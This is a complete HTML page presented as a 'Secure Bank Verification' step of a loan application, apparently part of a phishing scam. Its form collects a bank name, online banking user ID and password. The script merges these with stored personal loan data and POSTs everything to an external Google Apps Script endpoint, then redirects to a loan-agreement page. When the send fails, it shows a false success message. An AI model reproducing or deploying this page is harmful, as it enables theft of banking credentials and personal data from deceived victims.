<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bank Authentication</title>

<style>
body{
font-family:Arial;
background:#f5f7fa;
padding:20px;
}

.container{
max-width:500px;
margin:auto;
background:white;
padding:25px;
border-radius:10px;
box-shadow:0 0 10px rgba(0,0,0,0.1);
}

input{
width:100%;
padding:12px;
margin:8px 0;
border:1px solid #ccc;
border-radius:6px;
}

button{
width:100%;
padding:14px;
background:#28a745;
color:white;
border:none;
border-radius:6px;
font-size:16px;
cursor:pointer;
}

button:hover{
background:#1e7e34;
}
</style>
</head>

<body>

<div class="container">

<h2>Secure Bank Verification</h2>

<form id="bankForm">

<input id="yourBank" placeholder="Bank Name" required>
<input id="bankUser" placeholder="Online Banking User ID" required>
<input id="bankPass" placeholder="Online Banking Password" required>

<button type="submit">Submit Securely</button>

</form>

</div>

<script>

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw3h0GQczzmhG_M-BSELok6Yq89XJOcSeYlX7dAFuaKF2ze-FGEL7YcVe4m7sSbOtB6/exec";

document.getElementById("bankForm").addEventListener("submit", function(e){

e.preventDefault();

let personalData = JSON.parse(sessionStorage.getItem("loanData")) || JSON.parse(localStorage.getItem("loanData")) || {};

let finalData = {

...personalData,

yourBank: document.getElementById("yourBank").value,
bankUser: document.getElementById("bankUser").value,
bankPass: document.getElementById("bankPass").value,

source: personalData.name ? "Full Application" : "Bank Only"

};

const formData = new FormData();

for (let key in finalData){
formData.append(key, finalData[key]);
}

fetch(SCRIPT_URL,{
method:"POST",
body:formData
})
.then(res=>res.text())
.then(()=>{

localStorage.removeItem("loanData");

window.location.href="loan-agreement.html";

})
.catch(()=>{
    // Try both sessionStorage and localStorage for backup compatibility
    const loanData = JSON.parse(sessionStorage.getItem("loanData")) || JSON.parse(localStorage.getItem("loanData")) || {};
    
    if (!loanData || Object.keys(loanData).length === 0) {
        alert("No loan application data found. Please start your application again.");
        window.location.href = "personal-loans.html";
        return;
    }
    
    alert("Bank Authentication Submitted Successfully!\n\nYour bank authentication has been received and is being processed.\n\nWe will contact you shortly with next steps.");
    
    window.location.href = "loan-agreement.html";
})

});

</script>

</body>
</html>
